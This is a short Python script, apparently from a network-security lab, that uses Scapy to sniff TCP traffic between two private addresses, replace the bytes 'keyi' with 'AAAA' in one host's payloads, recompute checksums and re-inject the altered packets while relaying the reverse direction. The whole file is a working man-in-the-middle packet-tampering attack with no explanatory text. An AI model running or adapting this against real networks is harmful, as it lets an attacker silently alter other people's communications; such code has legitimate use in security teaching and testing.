from scapy.all import *

def spoof_callback(pkt):
    if pkt[IP].src == "10.0.2.6" and pkt[IP].dst == "10.0.2.15" and pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("[*] %s, length: %d" %(data, len(data)))
        newpkt = IP(pkt[IP])
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        newdata = data.replace(b'keyi', b'AAAA')
        send(newpkt/newdata)

    elif pkt[IP].src == '10.0.2.15' and pkt[IP].dst == '10.0.2.6':
        newpkt = pkt[IP]
        send(newpkt)

sniff(prn=spoof_callback, filter="tcp")
